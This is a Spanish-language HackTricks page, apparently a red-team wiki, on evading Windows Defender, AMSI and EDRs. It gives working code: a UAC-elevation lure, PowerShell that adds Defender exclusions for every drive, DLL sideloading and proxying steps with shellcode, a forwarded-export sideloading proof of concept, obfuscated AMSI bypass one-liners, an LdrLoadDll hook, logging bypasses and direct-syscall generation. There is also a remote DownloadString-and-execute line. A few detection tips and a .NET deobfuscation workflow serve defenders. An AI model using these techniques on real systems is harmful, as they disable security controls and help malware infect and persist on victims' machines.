# Bypass de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para impedir que Windows Defender funcione, simulando ser otro AV.
- [Deshabilitar Defender si eres admin](basic-powershell-for-pentesters/README.md)

### Señuelo de UAC al estilo de un instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de juegos suelen distribuirse como instaladores de Node.js/Nexe sin firmar que primero **piden al usuario permisos elevados** y solo después neutralizan Defender. El flujo es sencillo:

1. Comprueba si existe un contexto administrativo mediante `net session`. El comando solo se ejecuta correctamente cuando quien lo invoca tiene derechos de admin, por lo que un fallo indica que el loader se está ejecutando como un usuario estándar.
2. Inmediatamente se vuelve a iniciar con el verbo `RunAs` para activar el aviso de consentimiento de UAC esperado, conservando la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando software “crackeado”, por lo que normalmente aceptan el aviso, otorgando al malware los permisos que necesita para cambiar la política de Defender.

### Exclusiones generales de `MpPreference` para cada letra de unidad

Una vez elevado, las cadenas del estilo GachiLoader maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. Primero, el loader termina el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y después agrega **exclusiones extremadamente amplias**, haciendo que cada perfil de usuario, directorio del sistema y disco extraíble no pueda ser analizado:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre cada sistema de archivos montado (D:\, E:\, memorias USB, etc.), por lo que **cualquier payload futuro depositado en cualquier ubicación del disco será ignorado**.
- La exclusión de la extensión `.sys` está pensada para el futuro: los atacantes se reservan la opción de cargar drivers no firmados más adelante sin tener que modificar Defender de nuevo.
- Todos los cambios se realizan bajo `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite que las etapas posteriores confirmen que las exclusiones persisten o las amplíen sin volver a activar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de estado ingenuas siguen informando de que el “antivirus está activo”, aunque la inspección en tiempo real nunca toca esas rutas.

## **Metodología de evasión de AV**

Actualmente, los AV utilizan diferentes métodos para comprobar si un archivo es malicioso o no: detección estática, análisis dinámico y, en el caso de los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se consigue señalando strings maliciosos conocidos o arrays de bytes en un binario o script, y también extrayendo información del propio archivo (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente hayan sido analizadas y marcadas como maliciosas. Hay varias formas de evadir este tipo de detección:

- **Cifrado**

Si cifras el binario, el AV no podrá detectar tu programa, pero necesitarás algún tipo de loader para descifrarlo y ejecutar el programa en memoria.

- **Ofuscación**

A veces, todo lo que necesitas hacer es cambiar algunos strings de tu binario o script para que pase el AV, pero puede ser una tarea que consuma mucho tiempo, dependiendo de lo que intentes ofuscar.

- **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá signatures maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en varios segmentos y le pide a Defender que analice cada uno individualmente; de esta forma, puede decirte exactamente cuáles son los strings o bytes marcados en tu binario.

Te recomiendo encarecidamente que consultes esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### **Análisis dinámico**

El análisis dinámico ocurre cuando el AV ejecuta tu binario en un sandbox y observa si realiza actividad maliciosa (por ejemplo, intentar descifrar y leer las contraseñas de tu navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser algo más difícil de abordar, pero hay algunas cosas que puedes hacer para evadir los sandboxes.

- **Esperar antes de la ejecución** Dependiendo de cómo esté implementado, puede ser una excelente forma de evadir el análisis dinámico del AV. Los AV tienen muy poco tiempo para analizar los archivos sin interrumpir el flujo de trabajo del usuario, por lo que utilizar esperas largas puede interferir con el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente omitir la espera, dependiendo de cómo esté implementada.
- **Comprobar los recursos de la máquina** Normalmente, los Sandboxes tienen muy pocos recursos disponibles (por ejemplo, < 2GB de RAM), ya que de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí; por ejemplo, comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores, ya que no todo estará implementado en el sandbox.
- **Comprobaciones específicas de la máquina** Si quieres dirigirte a un usuario cuya workstation está unida al dominio `"contoso.local"`, puedes comprobar el dominio del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa se cierre.

Resulta que el computername del Sandbox de Microsoft Defender es HAL9TH, por lo que puedes comprobar el nombre del equipo en tu malware antes de la detonación. Si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, así que puedes hacer que tu programa se cierre.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p>canal #malware-dev de <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a></p></figcaption></figure>

Como hemos dicho antes en este post, las **herramientas públicas** acabarán **siendo detectadas**, así que deberías preguntarte algo:

Por ejemplo, si quieres hacer un dump de LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías utilizar un proyecto diferente, menos conocido y que también haga dump de LSASS?

La respuesta correcta probablemente sea la segunda. Tomando mimikatz como ejemplo, probablemente sea una de las piezas de malware más marcadas por los AV y EDR, si no la que más. Aunque el proyecto en sí es genial, también es una pesadilla trabajar con él para evadir los AV, así que busca alternativas para lograr lo que intentas conseguir.

> [!TIP]
> Al modificar tus payloads para evadir la detección, asegúrate de **desactivar el envío automático de muestras** en Defender y, por favor, en serio, **NO SUBAS A VIRUSTOTAL** nada si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si un AV concreto detecta tu payload, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para la evasión**. Según mi experiencia, los archivos DLL suelen estar **mucho menos detectados** y analizados, por lo que es un truco muy sencillo para evitar la detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un payload EXE normal de Havoc frente a un DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes utilizar con archivos DLL para ser mucho más stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL utilizado por el loader, colocando la aplicación víctima y los payload(s) maliciosos uno junto al otro.

Puedes comprobar qué programas son susceptibles a DLL Sideloading utilizando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explores por tu cuenta los programas susceptibles a DLL Hijacking/Sideloading**. Esta técnica es bastante sigilosa si se ejecuta correctamente, pero si utilizas programas DLL Sideloadable conocidos públicamente, podrían detectarte fácilmente.

El simple hecho de colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que se cargue tu payload, ya que el programa espera encontrar funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa realiza desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo gestionar la ejecución de tu payload.

Utilizaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente de una DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me). Yo diría que fue un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te recomiendo **encarecidamente** ver el [VOD de Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos analizado con mayor profundidad.

### Abusing Forwarded Exports (ForwardSideLoading)

Los módulos PE de Windows pueden exportar funciones que en realidad son "forwarders": en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII con el formato `TargetDll.TargetFunc`. Cuando un caller resuelve la exportación, el loader de Windows:

- Carga `TargetDll` si aún no se ha cargado
- Resuelve `TargetFunc` desde él

Comportamientos clave que debes comprender:
- Si `TargetDll` es una KnownDLL, se proporciona desde el namespace protegido KnownDLLs (por ejemplo, ntdll, kernelbase, ole32).
- Si `TargetDll` no es una KnownDLL, se utiliza el orden normal de búsqueda de DLL, que incluye el directorio del módulo que está realizando la resolución del forward.

Esto permite una primitiva de sideloading indirecto: encontrar una DLL firmada que exporte una función reenviada a un nombre de módulo que no sea una KnownDLL y colocar esa DLL firmada junto con una DLL controlada por el atacante cuyo nombre coincida exactamente con el del módulo de destino reenviado. Cuando se invoca la exportación reenviada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando su DllMain.

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es una KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca una `NCRYPTPROV.dll` maliciosa en la misma carpeta. Un `DllMain` mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activa el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamiento observado:
- rundll32 (firmado) carga el `keyiso.dll` side-by-side (firmado)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el loader sigue el forward hacia `NCRYPTPROV.SetAuditingInterface`
- El loader carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementado, aparecerá un error de "missing API" solo después de que `DllMain` ya se haya ejecutado

Consejos para hunting:
- Concéntrate en los exports forwarded cuyo módulo de destino no sea un KnownDLL. Los KnownDLLs aparecen en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar los exports forwarded con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitoriza LOLBins (p. ej., rundll32.exe) que carguen DLLs firmadas desde rutas que no sean del sistema, seguido de la carga de KnownDLLs con el mismo nombre base desde ese directorio
- Genera alertas sobre cadenas de procesos/módulos como: `rundll32.exe` → `keyiso.dll` no perteneciente al sistema → `NCRYPTPROV.dll` en rutas modificables por el usuario
- Aplica políticas de integridad del código (WDAC/AppLocker) y deniega permisos de escritura y ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un toolkit de payloads para evadir EDRs mediante procesos suspendidos, direct syscalls y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es simplemente un juego del gato y el ratón; lo que funciona hoy podría detectarse mañana, así que nunca dependas de una sola herramienta y, si es posible, intenta encadenar varias técnicas de evasión.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Los EDR suelen colocar **user-mode inline hooks** en los stubs de syscall de `ntdll.dll`. Para evitar esos hooks, puedes generar stubs de syscall **direct** o **indirect** que carguen el **SSN** (System Service Number) correcto y realicen la transición al kernel mode sin ejecutar el entrypoint exportado que contiene el hook.

**Invocation options:**
- **Direct (embedded)**: emite una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (no accede al export de `ntdll`).
- **Indirect**: salta a un gadget `syscall` existente dentro de `ntdll`, de modo que la transición al kernel parece originarse en `ntdll` (útil para la evasión heurística); **randomized indirect** selecciona un gadget de un pool en cada llamada.
- **Egg-hunt**: evita incrustar en disco la secuencia de opcode estática `0F 05`; resuelve una secuencia de syscall en runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infiere los SSN ordenando los stubs de syscall por dirección virtual en lugar de leer los bytes del stub.
- **SyscallsFromDisk**: mapea un `\KnownDlls\ntdll.dll` limpio, lee los SSN de su `.text` y después lo desmapea (evita todos los hooks en memoria).
- **RecycledGate**: combina la inferencia de SSN ordenada por VA con la validación de opcodes cuando un stub está limpio; recurre a la inferencia por VA si tiene un hook.
- **HW Breakpoint**: establece DR0 sobre la instrucción `syscall` y utiliza un VEH para capturar el SSN desde `EAX` en runtime, sin analizar bytes con hooks.

Ejemplo de uso de SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI se creó para prevenir el "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían escanear **archivos en disco**, por lo que, si de alguna manera podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, o UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros VBA de Office

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo su contenido en un formato no cifrado y sin ofuscar.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script; en este caso, powershell.exe

No dejamos ningún archivo en el disco, pero aun así fuimos detectados en memoria debido a AMSI.

Además, desde **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar una ejecución en memoria. Por eso se recomienda usar versiones inferiores de .NET (como 4.7.2 o anteriores) para la ejecución en memoria si quieres evadir AMSI.

Hay un par de formas de sortear AMSI:

- **Obfuscation**

Como AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen varias capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que evadirlo no sea tan sencillo. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y será suficiente, así que depende de cuánto se haya marcado algo.

- **AMSI Bypass**

Como AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar que la inicialización de AMSI falle (`amsiInitFailed`) hará que no se inicie ningún escaneo para el proceso actual. Esto fue divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation), y Microsoft ha desarrollado una firma para impedir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Solo hizo falta una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Por supuesto, esta línea ha sido detectada por el propio AMSI, por lo que es necesario modificarla para poder utilizar esta técnica.

Aquí tienes un AMSI bypass modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será marcado una vez que se publique este post, por lo que no deberías publicar ningún código si tu plan es permanecer indetectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para que devuelva el código correspondiente a E_INVALIDARG. De esta forma, el resultado del escaneo real devolverá 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obtener una explicación más detallada.

También existen muchas otras técnicas utilizadas para bypass AMSI con powershell. Consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para obtener más información sobre ellas.

### Bloqueo de AMSI impidiendo la carga de amsi.dll (hook de LdrLoadDll)

AMSI se inicializa únicamente después de que `amsi.dll` se haya cargado en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos para ese proceso.

Esquema de implementación (pseudocódigo de C/C++ para x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que, de otro modo, cargue AMSI).
- Combínalo con el envío de scripts mediante stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto en uso por loaders ejecutados mediante LOLBins (por ejemplo, `regsvr32` llamando a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera scripts para bypass de AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera scripts para bypass de AMSI que evitan las signatures mediante funciones y variables definidas por el usuario, expresiones de caracteres aleatorias y la aplicación aleatoria de mayúsculas y minúsculas a las keywords de PowerShell para evitar la signature.

**Elimina la signature detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la signature detectada de AMSI de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la signature de AMSI y sobrescribiéndola después con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa la versión 2 de PowerShell**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los escanee. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

El logging de PowerShell es una función que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para fines de auditoría y troubleshooting, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para bypass el logging de PowerShell, puedes utilizar las siguientes técnicas:

- **Deshabilitar PowerShell Transcription y Module Logging**: Puedes utilizar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar la versión 2 de Powershell**: Si utilizas PowerShell versión 2, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo así: `powershell.exe -version 2`
- **Usar una sesión de Powershell Unmanaged**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar un powershell sin defensas (esto es lo que utiliza `powerpick` de Cobal Strike).


## Obfuscation

> [!TIP]
> Varias técnicas de obfuscation dependen de cifrar datos, lo que aumentará la entropía del binario y facilitará su detección por parte de los AV y EDR. Ten cuidado con esto y, posiblemente, aplica el cifrado solo a secciones específicas de tu código que sean sensibles o deban ocultarse.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Al analizar malware que utiliza ConfuserEx 2 (o forks comerciales), es habitual encontrarse con varias capas de protección que bloquearán los decompiladores y sandboxes. El workflow siguiente **restaura un IL casi original** que después puede decompilarse a C# en herramientas como dnSpy o ILSpy.

1. Eliminación del anti-tampering – ConfuserEx cifra cada *method body* y lo descifra dentro del constructor estático (`<Module>.cctor`) del *module*. Esto también modifica el checksum del PE, por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las claves XOR y reescribir un assembly limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
El output contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`), que pueden ser útiles al crear tu propio unpacker.

2. Recuperación de símbolos / control-flow – proporciona el archivo *clean* a **de4dot-cex** (un fork de de4dot compatible con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará el control-flow flattening, restaurará los namespaces, las classes y los nombres de variables originales, y descifrará las strings constantes.

3. Eliminación de proxy calls – ConfuserEx reemplaza las llamadas directas a métodos por wrappers ligeros (también conocidos como *proxy calls*) para dificultar aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4. Limpieza manual – ejecuta el binario resultante en dnSpy y busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el payload *real*. A menudo, el malware lo almacena como un array de bytes codificado en TLV e inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin necesidad de ejecutar la muestra maliciosa**, lo que resulta útil al trabajar en una workstation offline.

> 🛈  ConfuserEx genera un atributo personalizado llamado `ConfusedByAttribute` que puede utilizarse como IOC para realizar un triage automático de las muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad del software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo utilizar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de templates de C++, lo que hará un poco más difícil la vida de la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar distintos pe files, incluidos: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor sencillo de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes compatibles con LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando las instrucciones normales en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un PE Crypter de .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad diseñado para proteger al usuario final frente a la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente mediante un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas con poca frecuencia activarán SmartScreen, alertando así al usuario final e impidiéndole ejecutar el archivo (aunque el archivo aún puede ejecutarse haciendo clic en More Info -> Run anyway).

